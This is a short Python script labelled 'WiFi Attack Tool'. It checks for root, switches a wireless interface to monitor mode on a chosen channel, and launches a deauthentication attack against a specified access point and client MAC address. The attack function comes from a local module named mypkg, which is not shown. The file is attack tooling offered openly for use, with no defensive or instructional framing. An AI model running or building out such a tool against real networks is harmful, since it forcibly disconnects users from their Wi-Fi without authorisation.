from scapy.all import *
import argparse
import os
import time
from mypkg import deauth_f,disassoc_f






if os.geteuid() != 0:
    print("[-] Run with sudo!")
    sys.exit(1)


def set_channel(interface, channel):
    try:
        os.system(f"iwconfig {interface} channel {channel}")
        print("[+] Channel was set correctly!")
        time.sleep(1)
    except Exception as e:
        print(f"[-] Error with channel! {e}")

def reset_channel(interface,channel):
    try:
        os.system(f"iwconfig {interface} mode monitor channel {((channel+9)%13)+1} ")
        time.sleep(1)
        os.system(f"iwconfig {interface} mode monitor channel {channel}")
        time.sleep(0.5)
        print(f"[+] Channel was set: {channel}")

        
    except Exception as e:
        print(f"[-] Error with channel! {e}")




parser = argparse.ArgumentParser(description='WiFi Attack Tool')
parser.add_argument('-m', '--mode', choices=['deauth'], help='Attack type')
parser.add_argument('-i', '--interface', required=True, help='Interface ')
parser.add_argument('-a', '--ap', required=True, help='MAC address of the AP')
parser.add_argument('-c', '--client', required=True, help='MAC address of the client')
parser.add_argument('-n', '--number', help='Number of deauths', type=int, default=1)
parser.add_argument('-r', '--random', type=int ,default=1, choices=[0,1],help='Randomization of parameters')
parser.add_argument('-o', '--channel',type=int,required=True, help='Channel')


args = parser.parse_args()

if args.mode == "deauth":

   
    try:
   
        reset_channel(args.interface,args.channel)
        deauth_f(bssid=args.ap,client=args.client,interface=args.interface,random_p=args.random)
        print("[+] Started deauthentication attack")

    except Exception as e:
        print("[-] Failed",e)

